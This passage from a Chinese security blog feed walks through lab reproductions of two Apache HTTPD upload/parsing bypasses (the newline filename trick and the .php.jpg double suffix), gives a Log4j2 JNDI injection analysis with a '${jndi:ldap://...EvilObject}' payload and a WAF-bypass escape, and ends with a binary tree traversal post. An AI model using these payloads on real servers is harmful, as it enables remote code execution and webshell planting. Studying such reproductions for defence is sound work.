<h1 id="什么是Apache"><a href="#什么是Apache" class="headerlink" title="什么是Apache"></a>什么是Apache</h1><p>Apache HTTP Server是一种Web服务器，负责回应收到的web请求。</p>
<p>例如，Apache收到<code>/index.php</code>的请求时，通过CGI调用PHP解释程序，执行<code>/index.php</code>，返回结果给客户端</p>
<blockquote>
<p><strong>httpd</strong>是Apache<a href="https://baike.baidu.com/item/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8535513">超文本传输协议</a>(HTTP)服务器的主程序。被设计为一个独立运行的后台进程，它会建立一个处理请求的子进程或线程的池。</p>
</blockquote>
<span id="more"></span>

<h1 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>影响版本：apache2.40~2.4.29</p>
<p>复现靶机：<a href="https://vulhub.org/#/environments/httpd/CVE-2017-15715/">https://vulhub.org/#/environments/httpd/CVE-2017-15715/</a></p>
<p>漏洞环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>



<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="漏洞形成点一：-与FilesMatch"><a href="#漏洞形成点一：-与FilesMatch" class="headerlink" title="漏洞形成点一：$与FilesMatch"></a>漏洞形成点一：$与FilesMatch</h3><p>在该版本的apache配置中，有一段这样的代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FilesMatch</span> \<span class="attr">.php</span>$&gt;</span></span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line"><span class="tag">&lt;/<span class="name">FilesMatch</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们使用<code>FilesMatch</code>来匹配<code>.php</code>结尾的文件，并将文件解析为php文件（<code>SetHandler application/x-httpd-php</code>）</p>
<p>此处<code>$</code>就是结尾的意思。但需要注意的是<strong>dollar</strong>符号也会匹配到换行符<code>0xa</code></p>
<p>举个例子： 如果文件名是<code>.php+换行符</code>结尾，仍然会被匹配，在这个情况下，依然会被解析为php文件。</p>
<h3 id="漏洞形成点二：文件上传点"><a href="#漏洞形成点二：文件上传点" class="headerlink" title="漏洞形成点二：文件上传点"></a>漏洞形成点二：文件上传点</h3><p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904143549934.png" alt="image-20210904143549934"></p>
<p>观察发现，在<code>index.php</code>中有一处上传点，此处会获取<code>name</code>参数，并检测name是否在黑名单内，如果不在，就会将上传的文件移动到当前目录下。</p>
<p>此处为什么不可以直接上传<code>.PHP</code>呢？如果你动手试一下，发现确实是可以上传的，而且绕过了黑名单。但问题在于，它并不会被解析。 在前面提到的配置文件中，<strong>FilesMatch</strong>只对<code>.php</code>后缀的文件进行匹配并解析，所以即使你能够上传<code>.PHP</code>，它也不会被解析为<code>php</code>文件。</p>
<p>但如果我们上传文件名是<code>.php+换行符</code>，那就可以成功绕过黑名单并解析了。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>抓包上传一个<code>php</code>木马</p>
<p>修改<code>name</code>参数（注意，POST请求中的参数名在html表格中是这样的 <code>name=&quot;这里是参数名&quot;</code>)</p>
<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904144515665.png" alt="image-20210904144515665"></p>
<p>在<code>php</code>后面加上空格，再把这个空格改成16进制的<code>0a</code>（换行符）</p>
<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904144609268.png" alt="image-20210904144609268"></p>
<p>使用菜刀访问：<code>/leihehe.php%0a</code></p>
<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210904144816659.png" alt="image-20210904144816659"></p>
<p><strong>注意：在windows下可能无法实现，因为windows下无法保存含有换行符的文件名</strong></p>
<h2 id="漏洞总结"><a href="#漏洞总结" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p><code>$</code>的正则匹配并不会过滤掉换行符<code>0xa</code>，以后遇见<code>$</code>，就有更多的潜在突破口了。</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://www.zhihu.com/question/19896544/answer/13284800">怎样通俗的讲解 PHP 和 Apache 的关系？ - yskin的回答 - 知乎 </a></p>
<p><a href="https://www.cnblogs.com/hello-py/articles/13519017.html">Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展</a></p>
<h1 id="Apache-HTTPD-多后缀解析漏洞"><a href="#Apache-HTTPD-多后缀解析漏洞" class="headerlink" title="Apache HTTPD 多后缀解析漏洞"></a>Apache HTTPD 多后缀解析漏洞</h1><h2 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>复现靶机：<a href="https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/">https://vulhub.org/#/environments/httpd/apache_parsing_vulnerability/</a></p>
<p>漏洞环境：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose build </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><h3 id="漏洞形成点一：AddHandler-php及Apache解析特性"><a href="#漏洞形成点一：AddHandler-php及Apache解析特性" class="headerlink" title="漏洞形成点一：AddHandler .php及Apache解析特性"></a>漏洞形成点一：AddHandler .php及Apache解析特性</h3><p>我们在配置文件下可以看到以下代码：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line">AddHandler application/x-httpd-php .php</span><br><span class="line"></span><br><span class="line">DirectoryIndex disabled</span><br><span class="line">DirectoryIndex index.php index.html</span><br></pre></td></tr></table></figure>

<p>此处的<code>AddHandler</code>的意思是如果后缀为<code>.php</code>，那么我们就给他加上<code>x-httpd-php</code>处理器，也就是将此文件解析为<code>php</code>文件。</p>
<p><code>Apache</code>在处理文件时有个特性 - 从右到左解析文件。</p>
<p>比如<code>hello.php.jpg</code>，Apache会先检测到<code>.jpg</code>这个后缀，接着他会在这个上面的配置文件中寻找，发现并没有解析<code>.jpg</code>的规则，于是他便<strong>往前寻找后缀</strong>，这时发现了<code>.php</code>后缀，再在配置文件中寻找发现<code>.php</code>可以被解析为<code>php</code>文件。由此，<code>hello.php.jpg</code>不会被解析为<code>jpg</code>，反而会被解析为<code>php</code>，即使<code>php</code>后缀不是在最后。</p>
<h3 id="漏洞形成点二：文件上传点-1"><a href="#漏洞形成点二：文件上传点-1" class="headerlink" title="漏洞形成点二：文件上传点"></a>漏洞形成点二：文件上传点</h3><p><code>index.php:</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (!empty($_FILES)):</span><br><span class="line"></span><br><span class="line">$ext = pathinfo($_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;], PATHINFO_EXTENSION);//获取后缀名</span><br><span class="line">if (!in_array($ext, [&#x27;gif&#x27;, &#x27;png&#x27;, &#x27;jpg&#x27;, &#x27;jpeg&#x27;])) &#123;</span><br><span class="line">    //如果后缀名不在白名单中，返回以下信息</span><br><span class="line">    die(&#x27;Unsupported filetype uploaded.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//如果后缀在白名单范围中，上传该文件</span><br><span class="line">$new_name = __DIR__ . &#x27;/uploadfiles/&#x27; . $_FILES[&#x27;file_upload&#x27;][&#x27;name&#x27;];</span><br><span class="line">if(!move_uploaded_file($_FILES[&#x27;file_upload&#x27;][&#x27;tmp_name&#x27;], $new_name))&#123;</span><br><span class="line">    die(&#x27;Error uploading file - check destination is writeable.&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">die(&#x27;File uploaded successfully: &#x27; . $new_name);</span><br><span class="line"></span><br><span class="line">else:</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    File: &lt;input type=&quot;file&quot; name=&quot;file_upload&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此处图片格式的文件可以被上传，那么我们可以伪造以下文件名:<code>hello.php.jpg</code></p>
<p>即可将文件成功上传，该文件会被解析为<code>.php</code>文件（<code>jpg</code>没有对应的解析规则，所以会往前寻找后缀）</p>
<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>上传一个文件名为<code>leihehe.php.jpg</code>的文件</p>
<p><img src="/image/Apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%B3%BB%E5%88%97/image-20210905114020401.png" alt="image-20210905114020401"></p>
<p>成功解析！</p>
<h2 id="漏洞总结-1"><a href="#漏洞总结-1" class="headerlink" title="漏洞总结"></a>漏洞总结</h2><p><code>Apache</code>在找不到相应后缀解析规则时，会往前寻找后缀 - 该特性很重要。</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache log4j2 命令执行漏洞复现</title>
    <url>/2021/12/10/Apache-log4j2-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都在讨论这个<strong>log4j2</strong>，可以说是重量级的漏洞了，大部分的java网站程序都在用它。漏洞的实现主要运用到了JNDI和LDAP，问题出在JndiLookup上</p>
<p><strong>影响范围: Apache Log4j 2.x &lt;= 2.14.1</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211210132347082.png" alt="image-20211210132347082"></p>
<p>此处没有对字符进行过滤，导致用户可以构造恶意代码。</p>
<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><p><strong>受攻击方客户端：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">log4j</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(log4j.class);</span><br><span class="line"><span class="comment">//PatternLayout.toSerializable</span></span><br><span class="line">    <span class="comment">//MessagePatternConverter.format</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:7777/#EvilObject&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ldap://127.0.0.1:7777/#EvilObject&#125;</code>是传入我们本地的恶意序列化对象。</p>
<p>具体实现见<a href="https://leihehe.top/2021/12/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8BJNDI%E6%B3%A8%E5%85%A5%E8%AF%A6%E8%A7%A3-9/">JNDI与LDAP的注入攻击</a></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211210133708492.png" alt="image-20211210133708492"></p>
<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="logIfEnabled"><a href="#logIfEnabled" class="headerlink" title="logIfEnabled"></a>logIfEnabled</h2><p>首先还是下个断点</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219175848710.png" alt="image-20211219175848710"></p>
<p>F7步入，这里会做一个log是否<strong>enabled</strong>的检测</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable throwable)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.isEnabled(level, marker, message, throwable)) &#123;<span class="comment">//这里检测isEnabled是否为真</span></span><br><span class="line">        <span class="built_in">this</span>.logMessage(fqcn, level, marker, message, throwable);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如何判定它是enabled的呢？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEnabled</span><span class="params">(<span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message, <span class="keyword">final</span> Throwable t)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.privateConfig.filter(level, marker, message, t);<span class="comment">//返回了config中的filter</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219183700833.png" alt="image-20211219183700833"></p>
<p>此处我们可以观察到，我们传入的level是**”ERROR”<strong>,其对应的level in integer为</strong>200**<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211219183913695.png" alt="image-20211219183913695"></p>
<p>正好等于当前logger Config要求的最高intLevel(200)</p>
<p>再根据官方手册，<strong>fatal</strong>和<strong>error</strong>也满足小于等于200的条件，因此我们使用<code>fatal(),error()</code>亦可触发漏洞。</p>
<table>
<thead>
<tr>
<th align="left">Standard Level</th>
<th align="left">intLevel</th>
</tr>
</thead>
<tbody><tr>
<td align="left">OFF</td>
<td align="left">0</td>
</tr>
<tr>
<td align="left">FATAL</td>
<td align="left">100</td>
</tr>
<tr>
<td align="left">ERROR</td>
<td align="left">200</td>
</tr>
<tr>
<td align="left">WARN</td>
<td align="left">300</td>
</tr>
<tr>
<td align="left">INFO</td>
<td align="left">400</td>
</tr>
<tr>
<td align="left">DEBUG</td>
<td align="left">500</td>
</tr>
<tr>
<td align="left">TRACE</td>
<td align="left">600</td>
</tr>
<tr>
<td align="left">ALL</td>
<td align="left">Integer.MAX_VALUE</td>
</tr>
</tbody></table>
<h2 id="MessagePatternConverter-format"><a href="#MessagePatternConverter-format" class="headerlink" title="MessagePatternConverter.format()"></a>MessagePatternConverter.format()</h2><p>关键点在<strong>messagePatternConverter#format</strong>中：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.config != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.noLookups) &#123;<span class="comment">//此处判断noLookups是否为false</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> offset; i &lt; workingBuilder.length() - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (workingBuilder.charAt(i) == <span class="string">&#x27;$&#x27;</span> &amp;&amp; workingBuilder.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>) &#123;<span class="comment">//找到$&#123;的位置</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> workingBuilder.substring(offset, workingBuilder.length());<span class="comment">//将包含$&#123;将其之后的字符串提取到value中</span></span><br><span class="line">            workingBuilder.setLength(offset);<span class="comment">//设置$之前的字符串长度</span></span><br><span class="line">            workingBuilder.append(<span class="built_in">this</span>.config.getStrSubstitutor().replace(event, value));<span class="comment">//append经过处理后的字符串value</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在默认情况下，noLookups为false</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220125208104.png" alt="image-20211220125208104"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS</span> <span class="operator">=</span> PropertiesUtil.getProperties().getBooleanProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>, <span class="literal">false</span>);<span class="comment">//默认为false</span></span><br></pre></td></tr></table></figure>

<h2 id="StrSubstitutor-substitute"><a href="#StrSubstitutor-substitute" class="headerlink" title="StrSubstitutor.substitute()"></a>StrSubstitutor.substitute()</h2><p>我们继续分析字符串value是如何被处理的。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220130516379.png" alt="image-20211220130516379"></p>
<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">prefixMatcher: <span class="built_in">$</span>&#123;</span><br><span class="line">suffixMatcher: &#125;</span><br><span class="line">escape: <span class="built_in">$</span></span><br><span class="line">delimiter: :-</span><br></pre></td></tr></table></figure>

<p>后面的逻辑便是寻找prefix,如果找到了，继续找suffix，找到suffix后把中间的字符串继续传进substitute() =》循环遍历检测内嵌的**${}**</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133308854.png"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133139043.png" alt="image-20211220133139043"></p>
<p>匹配了前缀后缀后，下面就是找<strong>delimiter</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220133728942.png" alt="image-20211220133728942"></p>
<p>看看label100的逻辑</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; varNameExprChars.length &amp;&amp; (substitutionInVariablesEnabled || prefixMatcher.isMatch(varNameExprChars, i, i, varNameExprChars.length) == <span class="number">0</span>); ++i) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.valueEscapeDelimiterMatcher != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">matchLen</span> <span class="operator">=</span> <span class="built_in">this</span>.valueEscapeDelimiterMatcher.isMatch(varNameExprChars, i);<span class="comment">//循环判断是否是delimiter :\\-</span></span><br><span class="line">        <span class="keyword">if</span> (matchLen != <span class="number">0</span>) &#123;<span class="comment">//匹配到了delimiter</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">varNamePrefix</span> <span class="operator">=</span> varNameExpr.substring(<span class="number">0</span>, i) + <span class="string">&#x27;:&#x27;</span>;<span class="comment">//将delimiter前的字符串加上：赋给varNamePrefix</span></span><br><span class="line">            varName = varNamePrefix + varNameExpr.substring(i + matchLen - <span class="number">1</span>);<span class="comment">//将\后面的字符串和之前的varNamePrefix合并在一起</span></span><br><span class="line">            <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + matchLen;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (j &gt;= varNameExprChars.length) &#123;</span><br><span class="line">                    <span class="keyword">break</span> label100;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, j)) != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">//判断是否是delimiter :-</span></span><br><span class="line">                    varName = varNamePrefix + varNameExpr.substring(i + matchLen, j);</span><br><span class="line">                    <span class="comment">//key值</span></span><br><span class="line">                    varDefaultValue = varNameExpr.substring(j + valueDelimiterMatchLen);</span><br><span class="line">                    <span class="comment">//value会丢弃掉:-及之前的所有字符串</span></span><br><span class="line">                    <span class="keyword">break</span> label100;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                ++j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">            varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">            varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((valueDelimiterMatchLen = valueDelimiterMatcher.isMatch(varNameExprChars, i)) != <span class="number">0</span>) &#123;</span><br><span class="line">        varName = varNameExpr.substring(<span class="number">0</span>, i);</span><br><span class="line">        varDefaultValue = varNameExpr.substring(i + valueDelimiterMatchLen);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的代码可能不太好理解，举两个例子</p>
<p>如果是</p>
<ul>
<li> <code>$&#123;hello:-world&#125;</code>  - <strong>key为hello, value则为world</strong></li>
<li><code>$&#123;hello:\\-world:-haha&#125;</code> - key为<strong>hello:world</strong>，value则为<strong>haha</strong><ul>
<li>也就是说<code>:\\-</code>是<code>:-</code>的转义符</li>
</ul>
</li>
</ul>
<p>这样的字符串替换可以用于绕过WAF</p>
<p>当替换完毕后，会执行到<strong>StrSubstitutor.resolveVariable()</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf, <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> <span class="built_in">this</span>.getVariableResolver();</span><br><span class="line">    <span class="keyword">return</span> resolver == <span class="literal">null</span> ? <span class="literal">null</span> : resolver.lookup(event, variableName);<span class="comment">//执行resolver.lookup()</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Interpolator-lookup"><a href="#Interpolator-lookup" class="headerlink" title="Interpolator.lookup()"></a>Interpolator.lookup()</h2><p>接着会执行**lookup()**，判断出要执行JNDI类型的Lookup</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220142228918.png" alt="image-20211220142228918"></p>
<h2 id="JndiLookup-lookup"><a href="#JndiLookup-lookup" class="headerlink" title="JndiLookup.lookup()"></a>JndiLookup.lookup()</h2><p>首先获取到jndiManager</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144414130.png" alt="image-20211220144414130"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JndiManager <span class="title function_">getDefaultManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (JndiManager)getManager(JndiManager.class.getName(), FACTORY, (Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144801055.png" alt="image-20211220144801055"></p>
<p>发现它是创建了一个Manager,将一个新的InitialContext传进去了</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144859470.png" alt="image-20211220144859470"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220144927509.png" alt="image-20211220144927509"></p>
<p>从而当我们执行<code>JndiLookup.lookup()</code>时，会触发<strong>initialContext.lookup()</strong></p>
<p>计算器成功弹出</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211220145107200.png" alt="image-20211220145107200"></p>
<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://su18.org/post/log4j2/">https://su18.org/post/log4j2/</a></p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Vulnerability Exploitation</tag>
      </tags>
  </entry>
  <entry>
    <title>Binary Tree Traversals (Inorder, Preorder and Postorder)</title>
    <url>/2022/07/10/Binary-Tree-Traversals-Inorder-Preorder-and-Postorder/</url>
    <content><![CDATA[<h1 id="What-is-Binary-Tree"><a href="#What-is-Binary-Tree" class="headerlink" title="What is Binary Tree?"></a>What is Binary Tree?</h1><p>Each node of the tree has at most two children - a left and a right child.</p>
<h2 id="Complete-Binary-Tree"><a href="#Complete-Binary-Tree" class="headerlink" title="Complete Binary Tree"></a>Complete Binary Tree</h2><blockquote>
<p>All the levels of the tree are filled completely except the lowest level nodes which are filled from as left as possible.</p>
</blockquote>
<p><img src="https://media.geeksforgeeks.org/wp-content/uploads/20220414154428/complete.jpg"></p>
<span id="more"></span>

<h2 id="Perfect-Binary-Tree"><a href="#Perfect-Binary-Tree" class="headerlink" title="Perfect Binary Tree"></a>Perfect Binary Tree</h2><p>A binary tree of height <strong>h</strong> having the maximum number of nodes is a <strong>perfect</strong> binary tree. </p>
<h2 id="Full-Binary-Tree"><a href="#Full-Binary-Tree" class="headerlink" title="Full Binary Tree"></a>Full Binary Tree</h2><p>A full Binary tree is a special type of binary tree in which every parent node/internal node <strong>has either two or no children</strong>. It is also known as a proper binary tree.</p>
<h1 id="Tree-Traversal"><a href="#Tree-Traversal" class="headerlink" title="Tree Traversal"></a>Tree Traversal</h1><h2 id="Iterative-Preorder-Traversal"><a href="#Iterative-Preorder-Traversal" class="headerlink" title="Iterative Preorder Traversal"></a>Iterative Preorder Traversal</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title function_">preorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        List&lt;Integer&gt; results = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span>(root==<span class="literal">null</span>) <span class="keyword">return</span> results;</span><br><span class="line">        Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        stack.push(root);</span><br><span class="line">        <span class="comment">//when it comes to the last node, stack will be empty</span></span><br><span class="line">        <span class="keyword">while</span>(!stack.empty())&#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            results.add(cur.val);</span><br><span class="line">            <span class="keyword">if</span>(cur.right!=<span class="literal">null</span>)</span><br><span class="line">                stack.push(cur.right);</span><br><span class="line">            <span class="keyword">if</span>(cur.left!=<span class="literal">null</span>)</span><br><span class="line">                stack.push(cur.left);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> results;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="Iterative-Inorder-Traversal"><a href="#Iterative-Inorder-Traversal" class="headerlink" title="Iterative Inorder Traversal"></a>Iterative Inorder Traversal</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> List&lt;Integer&gt; <span class="title function_">inorderTraversal</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root;</span><br><span class="line">    Stack&lt;TreeNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">while</span>(cur!=<span class="literal">null</span> || !stack.empty())&#123;</span><br><span class="line">        <span class="comment">//left</span></span><br><span class="line">        <span class="keyword">while</span>(cur!=<span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//root and right</span></span><br><span class="line">        <span class="keyword">if</span>(!stack.empty())&#123;</span><br><span class="line">            cur = stack.pop();</span><br><span class="line">            res.add(cur.val);</span><br><span class="line">            cur = cur.right;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

